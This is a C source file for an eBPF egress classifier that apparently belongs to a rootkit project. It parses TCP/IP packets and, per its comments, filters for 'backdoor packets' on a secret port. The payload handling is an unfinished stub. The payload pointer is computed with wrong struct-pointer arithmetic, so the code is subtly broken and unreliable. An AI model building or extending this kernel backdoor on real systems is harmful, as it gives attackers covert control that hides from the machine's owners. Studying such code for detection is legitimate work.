#include <linux/bpf.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <linux/swab.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>

#include "../../../common/constants.h"

SEC("classifier/egress")
int classifier(struct __sk_buff *skb){
	void *data = (void *)(__u64)skb->data;
	void *data_end = (void *)(__u64)skb->data_end;
    bpf_printk("TC egress classifier called\n");
	
	//We are interested on parsing TCP/IP packets so let's assume we have one
	//Ethernet header
	struct ethhdr *eth_hdr = data;
	if ((void *)eth_hdr + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	if(eth_hdr->h_proto != htons(ETH_P_IP)){
		//Not an IP packet
		bpf_printk("IP\n");
		return TC_ACT_OK;
	}

	//IP header
	struct iphdr *ip_hdr = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip_hdr + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip_hdr, data, data_end);
        return TC_ACT_OK;
    }
	if(ip_hdr->protocol != IPPROTO_TCP){
		bpf_printk("TCP\n");
		return TC_ACT_OK;
	}

	//TCP header
	struct tcphdr *tcp_hdr = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp_hdr + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
    }

	//We now proceed to scan for our backdoor packets
	__u16 dest_port = ntohs(tcp_hdr->dest);
	if(dest_port != SECRET_PACKET_DEST_PORT){
		bpf_printk("PORT CHECK\n");
		return TC_ACT_OK;
	}

	//Mark skb buffer readable and writable
	//bpf_skb_pull_data(skb, 0);

	__u32 payload_size = ntohs(ip_hdr->tot_len) - (tcp_hdr->doff * 4) - (ip_hdr->ihl * 4);
    char* payload = (void *)(tcp_hdr + tcp_hdr->doff*4);
	if ((void*)payload + payload_size > data_end){
		bpf_printk("PAYLOAD CHECK\n");
        return TC_ACT_OK;
    }

	bpf_printk("PAYLOAD size: %u\n", payload_size);
	
	
	



	return TC_ACT_OK;
	
}

char _license[4] SEC("license") = "GPL";